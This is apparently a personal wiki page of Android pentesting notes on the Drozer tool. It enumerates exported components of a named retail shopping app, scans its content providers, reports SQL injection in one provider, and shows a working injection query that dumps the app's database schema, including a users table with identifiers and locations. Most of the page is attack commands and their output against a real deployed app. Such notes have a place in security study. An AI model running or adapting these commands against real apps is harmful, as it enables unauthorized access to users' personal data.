---
title: Drozer - Tool for dyamic Exploration of Android Apps
description: 
published: true
date: 2023-01-19T19:22:40.756Z
tags: 
editor: markdown
dateCreated: 2023-01-19T19:22:40.756Z
---

# Summary

Runs a daemon on the device (doesn't need root, but might be better.)
Can do lots of adb like things.
Explore android specific attack surface and run things (intents providers etc).

Links
https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/drozer-tutorial

https://resources.infosecinstitute.com/topic/android-penetration-tools-walkthrough-series-drozer/
# Display attack surface
```
dz> run app.package.attacksurface com.kroger.kart
Attack Surface:
  10 activities exported
  3 broadcast receivers exported
  1 content providers exported
  1 services exported

```
# Get Activity Info
```
dz> run app.activity.info -a com.kroger.kart
Package: com.kroger.kart
  com.kroger.kart.presentation.view.LoginActivity
    Permission: null
  com.microsoft.identity.client.BrowserTabActivity
    Permission: null
  com.kroger.kart.presentation.view.LaunchActivity
    Permission: null
  com.kroger.kart.presentation.view.Callback
    Permission: null
  com.kroger.kart.presentation.view.Logout
    Permission: null
  com.microsoft.identity.client.CurrentTaskBrowserTabActivity
    Permission: null
  androidx.compose.ui.tooling.PreviewActivity
    Permission: null
  com.okta.oidc.OktaRedirectActivity
    Permission: null
  com.google.firebase.auth.internal.GenericIdpActivity
    Permission: null
  com.google.firebase.auth.internal.RecaptchaActivity
    Permission: null
```

# Run an Activity

# Get Broadcast Information

```
dz> run app.broadcast.info -a com.kroger.kart
Package: com.kroger.kart
  com.kroger.kart.widget.WidgetStoreWalk
    Permission: null
  androidx.work.impl.diagnostics.DiagnosticsReceiver
    Permission: android.permission.DUMP
  androidx.profileinstaller.ProfileInstallReceiver
    Permission: android.permission.DUMP
```

# Get Provider Information
```
dz> run app.provider.info -a com.kroger.kart
Package: com.kroger.kart
  Authority: com.kroger.kart.providers.UserContentProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.kroger.kart.providers.UserContentProvider
    Multiprocess Allowed: True
    Grant Uri Permissions: True
```
# Then get the URIs

```
dz> run scanner.provider.finduris -a com.kroger.kart
Scanning com.kroger.kart...
Unable to Query  content://com.kroger.kart.firebaseperfprovider/
Able to Query    content://com.kroger.kart.providers.UserContentProvider/
Unable to Query  content://com.kroger.kart.firebaseinitprovider
Unable to Query  content://com.kroger.kart.kaf.KafContextAppProvider/
Able to Query    content://com.kroger.kart.providers.UserContentProvider
Unable to Query  content://com.kroger.kart.firebaseperfprovider
Unable to Query  content://com.kroger.kart.kaf.KafContextAppProvider
Unable to Query  content://com.kroger.kart.firebaseinitprovider/
Unable to Query  content://com.kroger.kart.androidx-startup
Unable to Query  content://com.kroger.kart.androidx-startup/

Accessible content URIs:
  content://com.kroger.kart.providers.UserContentProvider
  content://com.kroger.kart.providers.UserContentProvider/

```

# Then see if you can inject into URIs
```
dz> run scanner.provider.injection -a com.kroger.kart
Scanning com.kroger.kart...
Not Vulnerable:
  content://com.kroger.kart.firebaseperfprovider/
  content://com.kroger.kart.firebaseinitprovider
  content://com.kroger.kart.kaf.KafContextAppProvider/
  content://com.kroger.kart.firebaseperfprovider
  content://com.kroger.kart.kaf.KafContextAppProvider
  content://com.kroger.kart.firebaseinitprovider/
  content://com.kroger.kart.androidx-startup
  content://com.kroger.kart.androidx-startup/

Injection in Projection:
  content://com.kroger.kart.providers.UserContentProvider
  content://com.kroger.kart.providers.UserContentProvider/

Injection in Selection:
  content://com.kroger.kart.providers.UserContentProvider
  content://com.kroger.kart.providers.UserContentProvider/
  ```
# Then exploit:
Note you can cause a sql error to figure out where you are in the query
```
dz> run app.provider.query content://com.kroger.kart.providers.UserContentProvider --projection "* from SQLITE_MASTER WHERE type='table';=="
| type  | name             | tbl_name         | rootpage | sql                                                                                                      |
| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                              |
| table | users            | users            | 4        | CREATE TABLE users (_id INTEGER PRIMARY KEY AUTOINCREMENT,  euid TEXT NOT NULL,  location TEXT NOT NULL) |
| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                                                   |
```


# Need to learn to start drozer from adb
adb am start PACKAGENAME:Intent
Don't know either PACKAGENAME or Intent yet.  Will fix page.

